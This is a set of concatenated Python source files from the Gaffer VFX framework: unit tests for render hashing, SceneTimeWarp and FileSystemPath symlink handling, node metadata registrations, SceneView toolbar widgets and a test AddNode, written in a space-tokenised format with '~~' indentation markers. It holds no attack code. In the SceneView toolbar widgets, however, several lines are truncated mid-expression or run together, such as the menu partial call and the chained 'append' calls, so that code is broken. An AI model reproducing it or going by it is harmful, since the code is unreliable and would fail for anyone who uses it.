self . assertEqual ( s [ "render" ] . hash ( c ) , IECore . MurmurHash ( ) ) \n 
\n 
# now theres an scene to render, we get some output \n 
s [ "render" ] [ "in" ] . setInput ( s [ "outputs" ] [ "out" ] ) \n 
self . assertNotEqual ( s [ "render" ] . hash ( c ) , IECore . MurmurHash ( ) ) \n 
\n 
# output varies by time \n 
self . assertNotEqual ( s [ "render" ] . hash ( c ) , s [ "render" ] . hash ( c2 ) ) \n 
\n 
# output varies by new Context entries \n 
current = s [ "render" ] . hash ( c ) \n 
c [ "renderDirectory" ] = self . temporaryDirectory ( ) + "/openGLRenderTest" \n 
self . assertNotEqual ( s [ "render" ] . hash ( c ) , current ) \n 
\n 
# output varies by changed Context entries \n 
current = s [ "render" ] . hash ( c ) \n 
c [ "renderDirectory" ] = self . temporaryDirectory ( ) + "/openGLRenderTest2" \n 
self . assertNotEqual ( s [ "render" ] . hash ( c ) , current ) \n 
\n 
\n 
current = s [ "render" ] . hash ( c ) \n 
c [ "ui:something" ] = "alterTheUI" \n 
self . assertEqual ( s [ "render" ] . hash ( c ) , current ) \n 
\n 
# also varies by input node \n 
current = s [ "render" ] . hash ( c ) \n 
s [ "render" ] [ "in" ] . setInput ( s [ "plane" ] [ "out" ] ) \n 
self . assertNotEqual ( s [ "render" ] . hash ( c ) , current ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import unittest \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
import GafferScene \n 
import GafferSceneTest \n 
\n 
class SceneTimeWarpTest ( GafferSceneTest . SceneTestCase ) : \n 
\n 
~~~ def testConstruct ( self ) : \n 
\n 
~~~ s = Gaffer . ScriptNode ( ) \n 
s [ "n" ] = GafferScene . SceneTimeWarp ( ) \n 
\n 
self . assertEqual ( s [ "n" ] [ "speed" ] . getValue ( ) , 1 ) \n 
self . assertEqual ( s [ "n" ] [ "offset" ] . getValue ( ) , 0 ) \n 
\n 
~~ def testRunTimeTyped ( self ) : \n 
\n 
~~~ n = GafferScene . SceneTimeWarp ( ) \n 
self . failUnless ( n . isInstanceOf ( GafferScene . SceneTimeWarp . staticTypeId ( ) ) ) \n 
self . failUnless ( n . isInstanceOf ( GafferScene . SceneContextProcessor . staticTypeId ( ) ) ) \n 
self . failUnless ( n . isInstanceOf ( GafferScene . SceneProcessor . staticTypeId ( ) ) ) \n 
self . failUnless ( n . isInstanceOf ( GafferScene . SceneNode . staticTypeId ( ) ) ) \n 
self . failUnless ( n . isInstanceOf ( Gaffer . Node . staticTypeId ( ) ) ) \n 
\n 
baseTypeIds = IECore . RunTimeTyped . baseTypeIds ( n . typeId ( ) ) \n 
\n 
self . failUnless ( GafferScene . SceneContextProcessor . staticTypeId ( ) in baseTypeIds ) \n 
self . failUnless ( GafferScene . SceneProcessor . staticTypeId ( ) in baseTypeIds ) \n 
self . failUnless ( GafferScene . SceneNode . staticTypeId ( ) in baseTypeIds ) \n 
self . failUnless ( Gaffer . Node . staticTypeId ( ) in baseTypeIds ) \n 
\n 
~~ def testAffects ( self ) : \n 
\n 
~~~ n = GafferScene . SceneTimeWarp ( ) \n 
\n 
c = GafferTest . CapturingSlot ( n . plugDirtiedSignal ( ) ) \n 
n [ "speed" ] . setValue ( 2 ) \n 
\n 
found = False \n 
for cc in c : \n 
~~~ if cc [ 0 ] . isSame ( n [ "out" ] ) : \n 
~~~ found = True \n 
~~ ~~ self . failUnless ( found ) \n 
\n 
del c [ : ] \n 
n [ "offset" ] . setValue ( 2 ) \n 
found = False \n 
for cc in c : \n 
~~~ if cc [ 0 ] . isSame ( n [ "out" ] ) : \n 
~~~ found = True \n 
~~ ~~ self . failUnless ( found ) \n 
\n 
~~ def testNoExtraInputs ( self ) : \n 
\n 
~~~ p = GafferScene . Plane ( ) \n 
n = GafferScene . SceneTimeWarp ( ) \n 
n [ "in" ] . setInput ( p [ "out" ] ) \n 
\n 
self . assertTrue ( "in1" not in n ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import Gaffer \n 
import GafferScene \n 
\n 
Gaffer . Metadata . registerNode ( \n 
\n 
GafferScene . Cube , \n 
\n 
"description" , \n 
"""\n\tProduces scenes containing a cube.\n\t""" , \n 
\n 
plugs = { \n 
\n 
"dimensions" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tThe size of the cube.\n\t\t\t""" , \n 
\n 
] , \n 
\n 
} \n 
\n 
) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import Gaffer \n 
import GafferScene \n 
import GafferUI \n 
\n 
Gaffer . Metadata . registerNode ( \n 
\n 
GafferScene . ObjectSource , \n 
\n 
"description" , \n 
"""\n\tA node which produces scenes with exactly one object in them.\n\t""" , \n 
\n 
plugs = { \n 
\n 
"name" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tThe name of the object in the output scene.\n\t\t\t""" , \n 
\n 
] , \n 
\n 
"transform" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tThe transform applied to the object.\n\t\t\t""" , \n 
\n 
"layout:section" , "Transform" , \n 
\n 
] , \n 
\n 
"sets" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tA list of sets to include the object in. The\n\t\t\tnames should be separated by spaces.\n\t\t\t""" , \n 
\n 
] , \n 
\n 
} \n 
\n 
) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2013, Image Engine Design Inc. All rights reserved. \n 
#  Copyright (c) 2014, John Haddon. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
import functools \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferUI \n 
import GafferScene \n 
import GafferSceneUI \n 
\n 
Gaffer . Metadata . registerNode ( \n 
\n 
GafferSceneUI . SceneView , \n 
\n 
plugs = { \n 
\n 
"shadingMode" : [ \n 
\n 
"toolbarLayout:index" , 2 , \n 
"toolbarLayout:divider" , True , \n 
"plugValueWidget:type" , "GafferSceneUI.SceneViewToolbar._ShadingModePlugValueWidget" , \n 
\n 
] , \n 
\n 
"minimumExpansionDepth" : [ \n 
\n 
"plugValueWidget:type" , "GafferSceneUI.SceneViewToolbar._ExpansionPlugValueWidget" , \n 
"toolbarLayout:divider" , True , \n 
\n 
] , \n 
\n 
"lookThrough" : [ \n 
\n 
"plugValueWidget:type" , "GafferSceneUI.SceneViewToolbar._LookThroughPlugValueWidget" , \n 
"toolbarLayout:divider" , True , \n 
"toolbarLayout:label" , "" , \n 
\n 
] , \n 
\n 
"lookThrough.enabled" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tWhen enabled, locks the view to look through a specific camera in the scene.\n\t\t\tBy default, the current render camera is used, but this can be changed using the lookThrough.camera\n\t\t\tsetting.\n\t\t\t""" , \n 
] , \n 
\n 
"lookThrough.camera" : [ \n 
\n 
"description" , \n 
"""\n\t\t\tSpecifies the camera to look through when lookThrough.enabled is on. The default value\n\t\t\tmeans that the current render camera will be used - the paths to other cameras may be specified\n\t\t\tto choose another camera."\n\t\t\t""" , \n 
] , \n 
\n 
"grid" : [ \n 
\n 
"plugValueWidget:type" , "GafferSceneUI.SceneViewToolbar._GridPlugValueWidget" , \n 
\n 
] , \n 
\n 
"gnomon" : [ \n 
\n 
"plugValueWidget:type" , "" , \n 
\n 
] , \n 
\n 
} \n 
\n 
) \n 
\n 
########################################################################## \n 
# _ShadingModePlugValueWidget \n 
########################################################################## \n 
\n 
class _ShadingModePlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ menuButton = GafferUI . MenuButton ( \n 
image = "shading.png" , \n 
menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __menuDefinition ) ) , \n 
hasFrame = False , \n 
) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , menuButton , plug , parenting = parenting ) \n 
\n 
~~ def hasLabel ( self ) : \n 
\n 
~~~ return True \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ pass \n 
\n 
~~ def __menuDefinition ( self ) : \n 
\n 
~~~ m = IECore . MenuDefinition ( ) \n 
\n 
currentName = self . getPlug ( ) . getValue ( ) \n 
for name in [ "" ] + GafferSceneUI . SceneView . registeredShadingModes ( ) : \n 
~~~ m . append ( \n 
"/" + name if name else "Default" , \n 
{ \n 
"checkBox" : name == currentName , \n 
"command" : functools . partial ( Gaffer . WeakMethod ( self . __setValue ) , name if name != currentName } \n 
) \n 
\n 
if not name : \n 
~~~ m . append ( "/DefaultDivider" , { "divider" : True } ) \n 
\n 
~~ ~~ return m \n 
\n 
~~ def __setValue ( self , value , * unused ) : \n 
\n 
~~~ self . getPlug ( ) . setValue ( value ) \n 
\n 
########################################################################## \n 
# _ExpansionPlugValueWidget \n 
########################################################################## \n 
\n 
~~ ~~ class _ExpansionPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __menuDefinition ) ) \n 
menuButton = GafferUI . MenuButton ( menu = menu , image = "expansion.png" , hasFrame = False ) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , menuButton , plug , parenting = parenting ) \n 
\n 
~~ def hasLabel ( self ) : \n 
\n 
~~~ return True \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ pass \n 
\n 
~~ def __menuDefinition ( self ) : \n 
\n 
~~~ expandAll = bool ( self . getPlug ( ) . getValue ( ) ) \n 
\n 
m = IECore . MenuDefinition ( ) \n 
m . append ( "/Expand Selection" , { "command" : self . getPlug ( ) . node ( ) . expandSelection , "active" : not m . append ( "/Expand Selection Fully" , { "command" : IECore . curry ( self . getPlug ( ) . node ( ) . expandSelection m . append ( "/Collapse Selection" , { "command" : self . getPlug ( ) . node ( ) . collapseSelection , "active" : m . append ( "/Expand All Divider" , { "divider" : True } ) \n 
m . append ( "/Expand All" , { "checkBox" : expandAll , "command" : Gaffer . WeakMethod ( self . __toggleMinimumExpansionDepth \n 
return m \n 
\n 
~~ def __toggleMinimumExpansionDepth ( self , * unused ) : \n 
\n 
~~~ self . getPlug ( ) . setValue ( 0 if self . getPlug ( ) . getValue ( ) else 999 ) \n 
\n 
########################################################################## \n 
# _LookThroughPlugValueWidget \n 
########################################################################## \n 
\n 
~~ ~~ class _LookThroughPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ row = GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Horizontal ) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , row , plug , parenting = parenting ) \n 
\n 
with row : \n 
~~~ self . __enabledWidget = GafferUI . BoolPlugValueWidget ( plug [ "enabled" ] , displayMode = GafferUI . BoolWidget self . __cameraWidget = GafferSceneUI . ScenePathPlugValueWidget ( \n 
plug [ "camera" ] , \n 
path = GafferScene . ScenePath ( \n 
plug . node ( ) [ "in" ] , \n 
plug . node ( ) . getContext ( ) , \n 
"/" , \n 
filter = GafferScene . ScenePath . createStandardFilter ( [ "__cameras" ] , "Show only cameras" ) \n 
) , \n 
) \n 
self . __cameraWidget . pathWidget ( ) . setFixedCharacterWidth ( 13 ) \n 
if hasattr ( self . __cameraWidget . pathWidget ( ) . _qtWidget ( ) , "setPlaceholderText" ) : \n 
~~~ self . __cameraWidget . pathWidget ( ) . _qtWidget ( ) . setPlaceholderText ( "Render Camera" ) \n 
\n 
~~ ~~ self . _updateFromPlug ( ) \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ with self . getContext ( ) : \n 
~~~ self . __cameraWidget . setEnabled ( self . getPlug ( ) [ "enabled" ] . getValue ( ) ) \n 
\n 
########################################################################## \n 
# _GridPlugValueWidget \n 
########################################################################## \n 
\n 
~~ ~~ ~~ class _GridPlugValueWidget ( GafferUI . PlugValueWidget ) : \n 
\n 
~~~ def __init__ ( self , plug , parenting = None ) : \n 
\n 
~~~ menu = GafferUI . Menu ( Gaffer . WeakMethod ( self . __menuDefinition ) ) \n 
menuButton = GafferUI . MenuButton ( menu = menu , image = "grid.png" , hasFrame = False ) \n 
\n 
GafferUI . PlugValueWidget . __init__ ( self , menuButton , plug , parenting = parenting ) \n 
\n 
~~ def hasLabel ( self ) : \n 
\n 
~~~ return True \n 
\n 
~~ def _updateFromPlug ( self ) : \n 
\n 
~~~ pass \n 
\n 
~~ def __menuDefinition ( self ) : \n 
\n 
~~~ m = IECore . MenuDefinition ( ) \n 
m . append ( \n 
"/Show Grid" , \n 
{ \n 
"checkBox" : self . getPlug ( ) [ "visible" ] . getValue ( ) , \n 
"command" : self . getPlug ( ) [ "visible" ] . setValue , \n 
} \n 
) \n 
\n 
m . append ( \n 
"/Show Gnomon" , \n 
{ \n 
"checkBox" : self . getPlug ( ) . node ( ) [ "gnomon" ] [ "visible" ] . getValue ( ) , \n 
"command" : self . getPlug ( ) . node ( ) [ "gnomon" ] [ "visible" ] . setValue , \n 
} \n 
) \n 
\n 
return m \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2011-2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2012-2013, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ ~~ import IECore \n 
import Gaffer \n 
\n 
class AddNode ( Gaffer . ComputeNode ) : \n 
\n 
~~~ def __init__ ( self , name = "AddNode" ) : \n 
\n 
~~~ Gaffer . ComputeNode . __init__ ( self , name ) \n 
\n 
p1 = Gaffer . IntPlug ( "op1" , Gaffer . Plug . Direction . In ) \n 
p2 = Gaffer . IntPlug ( "op2" , Gaffer . Plug . Direction . In ) \n 
\n 
self . addChild ( Gaffer . BoolPlug ( "enabled" , defaultValue = True ) ) \n 
self . addChild ( p1 ) \n 
self . addChild ( p2 ) \n 
\n 
p3 = Gaffer . IntPlug ( "sum" , Gaffer . Plug . Direction . Out ) \n 
\n 
self . addChild ( p3 ) \n 
\n 
self . numHashCalls = 0 \n 
self . numComputeCalls = 0 \n 
\n 
~~ def enabledPlug ( self ) : \n 
\n 
~~~ return self [ "enabled" ] \n 
\n 
~~ def correspondingInput ( self , output ) : \n 
\n 
~~~ if output . isSame ( self [ "sum" ] ) : \n 
\n 
~~~ return self [ "op1" ] \n 
\n 
~~ return Gaffer . ComputeNode . correspondingInput ( self , output ) \n 
\n 
~~ def affects ( self , input ) : \n 
\n 
~~~ outputs = Gaffer . ComputeNode . affects ( self , input ) \n 
if input . getName ( ) in ( "enabled" , "op1" , "op2" ) : \n 
~~~ outputs . append ( self . getChild ( "sum" ) ) \n 
\n 
~~ return outputs \n 
\n 
~~ def hash ( self , output , context , h ) : \n 
\n 
~~~ assert ( output . isSame ( self . getChild ( "sum" ) ) or plug . getFlags ( ) & plug . Flags . Dynamic ) \n 
\n 
self . getChild ( "enabled" ) . hash ( h ) \n 
self . getChild ( "op1" ) . hash ( h ) \n 
self . getChild ( "op2" ) . hash ( h ) \n 
\n 
self . numHashCalls += 1 \n 
\n 
~~ def compute ( self , plug , context ) : \n 
\n 
\n 
# in order to support GafferTest.ScriptNodeTest.testDynamicPlugSerialisation(). \n 
~~~ assert ( plug . isSame ( self . getChild ( "sum" ) ) or plug . getFlags ( ) & plug . Flags . Dynamic ) \n 
assert ( isinstance ( context , Gaffer . Context ) ) \n 
assert ( plug . settable ( ) ) \n 
assert ( not self [ "op1" ] . settable ( ) ) \n 
assert ( not self [ "op2" ] . settable ( ) ) \n 
\n 
if self [ "enabled" ] . getValue ( ) : \n 
~~~ plug . setValue ( self . getChild ( "op1" ) . getValue ( ) + self . getChild ( "op2" ) . getValue ( ) ) \n 
~~ else : \n 
~~~ plug . setValue ( self . getChild ( "op1" ) . getValue ( ) ) \n 
\n 
~~ self . numComputeCalls += 1 \n 
\n 
~~ ~~ IECore . registerRunTimeTyped ( AddNode , typeName = "GafferTest::AddNode" ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2011, John Haddon. All rights reserved. \n 
#  Copyright (c) 2012-2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
from __future__ import with_statement \n 
\n 
import unittest \n 
import time \n 
import datetime \n 
import pwd \n 
import grp \n 
import os \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
\n 
class FileSystemPathTest ( GafferTest . TestCase ) : \n 
\n 
~~~ def test ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( __file__ ) \n 
\n 
self . assert_ ( p . isValid ( ) ) \n 
self . assert_ ( p . isLeaf ( ) ) \n 
\n 
while len ( p ) : \n 
\n 
~~~ del p [ - 1 ] \n 
self . assert_ ( p . isValid ( ) ) \n 
self . assert_ ( not p . isLeaf ( ) ) \n 
\n 
~~ ~~ def testIsLeaf ( self ) : \n 
\n 
~~~ path = Gaffer . FileSystemPath ( "/this/path/doesnt/exist" ) \n 
self . assert_ ( not path . isLeaf ( ) ) \n 
\n 
~~ def testConstructWithFilter ( self ) : \n 
\n 
~~~ p = Gaffer . FileSystemPath ( __file__ ) \n 
self . failUnless ( p . getFilter ( ) is None ) \n 
\n 
f = Gaffer . FileNamePathFilter ( [ "*.exr" ] ) \n 
p = Gaffer . FileSystemPath ( __file__ , filter = f ) \n 
self . failUnless ( p . getFilter ( ) . isSame ( f ) ) \n 
\n 
~~ def testBrokenSymbolicLinks ( self ) : \n 
\n 
~~~ os . symlink ( self . temporaryDirectory ( ) + "/nonExistent" , self . temporaryDirectory ( ) + "/broken" ) \n 
\n 
\n 
d = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) ) \n 
c = d . children ( ) \n 
self . assertEqual ( len ( c ) , 1 ) \n 
\n 
l = c [ 0 ] \n 
self . assertEqual ( str ( l ) , self . temporaryDirectory ( ) + "/broken" ) \n 
\n 
# we also want broken symlinks to report themselves as "valid", \n 
# because having a path return a child and then claim the child \n 
# is invalid seems rather useless. admittedly this is a bit of \n 
# a compromise. \n 
self . assertEqual ( l . isValid ( ) , True ) \n 
\n 
# since we said it was valid, it ought to have some info \n 
info = l . info ( ) \n 
self . failUnless ( info is not None ) \n 
\n 
~~ def testSymLinkInfo ( self ) : \n 
\n 
~~~ with open ( self . temporaryDirectory ( ) + "/a" , "w" ) as f : \n 
~~~ f . write ( "AAAA" ) \n 
\n 
~~ os . symlink ( self . temporaryDirectory ( ) + "/a" , self . temporaryDirectory ( ) + "/l" ) \n 
\n 
# symlinks should report the info for the file \n 
# they point to. \n 
a = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) + "/a" ) \n 
l = Gaffer . FileSystemPath ( self . temporaryDirectory ( ) + "/l" ) \n 
aInfo = a . info ( ) \n 
self . assertEqual ( aInfo [ "fileSystem:size" ] , l . info ( ) [ "fileSystem:size" ] ) \n 
\n 
os . remove ( str ( a ) ) \n 
